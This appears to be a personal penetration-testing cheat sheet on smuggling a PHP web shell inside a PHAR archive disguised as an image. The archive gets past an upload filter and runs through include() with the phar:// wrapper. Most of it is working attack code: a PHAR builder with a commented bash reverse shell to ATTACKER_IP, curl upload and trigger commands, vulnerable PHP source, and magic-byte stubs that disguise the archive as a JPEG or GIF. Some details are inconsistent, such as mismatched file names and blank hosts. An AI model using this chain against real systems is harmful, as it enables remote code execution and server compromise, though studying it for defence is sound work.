# php phar RFI smuggling

**Author:** Julien Bongars\
**Date:** 2026-02-13 01:36:15\
**Path:**

---

link: https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html

You can use phar:// protocol to smuggle a PHP source page to destination

### Attack

#### Construct the PHAR

```php
<?php
$phar = new Phar('attack.phar');
$phar->startBuffering();
/* $shell = "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'); ?>"; */
$shell = file_get_contents('shell.php');
$phar->addFromString('shell.php', $shell);
$phar->setStub("<?php __HALT_COMPILER(); ?>");

// add object of any class as meta data
$phar->stopBuffering();
```

#### Upload and call the PHAR/shell.php

```bash
# Step 1: Build the PHAR
php attack.php
mv attack.phar attack.jpeg

# Step 2: Upload the file (bypass extension filter since .jpg is allowed)
curl -X POST http:///index.php \
  -F "upload=1" \
  -F "file=@shell.jpg"

# Step 3: Trigger RFI via phar:// stream wrapper
# The include() appends ".php", and phar:// lets us reference shell.php inside the archive
# phar://uploads/shell.jpg/shell  +  ".php"  =>  phar://uploads/shell.jpg/shell.php
curl "http:///index.php?page=phar://uploads/shell.jpg/shell&cmd=id"

# Expected output: uid=33(www-data) ...
```

### Source

```php
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	


    if($_POST['upload']){
        $file = $_FILES['file']['name'];

        # Check if extension is allowed.
        $ext = getExtension($file);
        if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
            die("Extension not allowed!");
        }

        # Upload the file.
        $final_path = $dir.$file;
        move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $file);
    }
```

## PHP PHAR obfuscation

### Set magic jpeg bits

```php
<?php
$phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
```

### Set magic gif bits

```php
<?php
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
```

### Use a real jpeg

```php
<?php
$jpeg = file_get_contents('legit.jpg');  // any valid JPEG
$phar->setStub($jpeg . "<?php __HALT_COMPILER(); ?>");
```
